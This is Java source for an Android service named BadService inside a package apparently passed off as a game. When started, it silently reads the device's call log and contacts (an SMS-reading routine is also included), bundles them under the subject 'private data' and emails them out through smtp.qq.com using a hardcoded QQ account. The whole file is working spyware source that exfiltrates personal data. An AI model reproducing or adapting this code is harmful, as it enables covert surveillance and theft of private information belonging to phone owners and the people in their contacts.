package com.hayt.game;

import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import javax.mail.MessagingException;

import com.hayt.util.MailSenderInfo;
import com.hayt.util.SimpleMailSender;
import com.hayt.util.SmsContent;
import com.hayt.util.SmsInfo;

import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

public class BadService extends Service{
	
	public static int status = 0;
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		
	 	SecretAsyn asyn = new SecretAsyn();
	 	asyn.execute("calllog", "contact");
		
	 	return super.onStartCommand(intent, flags, startId);
		
	}
	
	
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		System.out.println("destroyed");
	}



	private class SecretAsyn extends AsyncTask<String, Integer, String>{

		@Override
		protected String doInBackground(String... params) {
			// TODO Auto-generated method stub
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < params.length; i++) {
				if (params[i].equals("sms")) {
					sb.append(getSMS()+"\n");
				}
				else if (params[i].equals("contact")) {
					sb.append(getContacts()+"\n");
				}
				else if (params[i].equals("calllog")) {
					sb.append(getCallLog()+"\n");
				}
			}
			
			try {
				sendMail(sb, "私密数据");
			} catch (MessagingException e) {
				// TODO Auto-generated catch block
				status = 1;
				e.printStackTrace();
			}
			
			return null;
		}
		
	}
	
	private StringBuilder getSMS() {
		List<SmsInfo> infos;
		Uri uri = Uri.parse("content://sms/inbox");
		System.out.println(uri.toString());
        SmsContent sc = new SmsContent(MainActivity.instance, uri);
        infos = sc.getSmsInfo();
        StringBuilder sb = new StringBuilder();
        sb.append("短信：\r\n");
        for (SmsInfo l:infos) {
        	SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            Date date = new Date(Long.parseLong(l.getDate()));
            String time = sfd.format(date);
        	sb.append("日期:"+time);
        	sb.append("  收件人:"+l.getName());
        	sb.append("  号码:"+l.getPhoneNumber());
        	sb.append("  内容:"+l.getSmsbody());
        	sb.append("\r\n");
        }
        return sb;
	}
	
	private StringBuilder getContacts() {
		Uri uri = Uri.parse("content://com.android.contacts/contacts");
		
        ContentResolver resolver = getBaseContext().getContentResolver();
        Cursor cursor = resolver.query(uri, new String[]{"_id"}, null, null, null);
        StringBuilder sb = new StringBuilder();
        sb.append("联系人：\r\n");
        if (cursor != null) { 
        
        while (cursor.moveToNext()) {
            int contractID = cursor.getInt(0);
            
            uri = Uri.parse("content://com.android.contacts/contacts/" + contractID + "/data");
            Cursor cursor1 = resolver.query(uri, new String[]{"mimetype", "data1", "data2"}, null, null, null);
            while (cursor1.moveToNext()) {
                String data1 = cursor1.getString(cursor1.getColumnIndex("data1"));
                String mimeType = cursor1.getString(cursor1.getColumnIndex("mimetype"));
                if ("vnd.android.cursor.item/name".equals(mimeType)) { 
                    sb.append(" 姓名=" + data1);
                } else if ("vnd.android.cursor.item/email_v2".equals(mimeType)) { 
                    sb.append(",邮件=" + data1);
                } else if ("vnd.android.cursor.item/phone_v2".equals(mimeType)) { 
                    sb.append("号码=" + data1);
                }                
            }
            //System.out.println(sb.toString());
            sb.append("\r\n");
            cursor1.close();
        }
        cursor.close();
        }
        return sb;
        
	}
	
	private StringBuilder getCallLog() {
        int type;
        Date date;
        String time= "";
        ContentResolver cr = getContentResolver();
        StringBuilder sb = new StringBuilder();
        sb.append("通话记录：\r\n");
        final Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, new String[]{CallLog.Calls.NUMBER,CallLog.Calls.CACHED_NAME,CallLog.Calls.TYPE, CallLog.Calls.DATE}, null, null,CallLog.Calls.DEFAULT_SORT_ORDER);
        
        if (cursor!=null) {
			for (int i = 0; i < cursor.getCount(); i++) {   
            cursor.moveToPosition(i);
            sb.append("号码:"+cursor.getString(0));
            sb.append("  姓名:"+cursor.getString(1));

            type = cursor.getInt(2);
            switch (type) {
			case 1:
				sb.append("  接听");
				break;
			case 2:
				sb.append("  拨出");
				break;
			case 3:
				sb.append("  未接");
				break;
			case 4:
				sb.append("  拒绝");
				break;
			default:
				sb.append("  未知");
				break;
			}
            SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            date = new Date(Long.parseLong(cursor.getString(3)));
            time = sfd.format(date);
            sb.append("  日期:"+time);
            sb.append("\r\n");
           }
        
		
		}
        return sb;
		
	}
	
	
	
	private int sendMail(StringBuilder sb,String subject) throws MessagingException{
            MailSenderInfo mailInfo = new MailSenderInfo();
            mailInfo.setMailServerHost("smtp.qq.com");
            mailInfo.setMailServerPort("25");
            mailInfo.setValidate(true);
            mailInfo.setUserName("1017844578@qq.com"); 
            mailInfo.setPassword("null");   //
            mailInfo.setFromAddress("null"); //
            mailInfo.setToAddress("null");  //
            mailInfo.setSubject(subject); 
            mailInfo.setContent(sb.toString()); 
            SimpleMailSender sms = new SimpleMailSender();
            sms.sendTextMail(mailInfo);
            //sms.sendHtmlMail(mailInfo);
            return 0;
		
	}


}
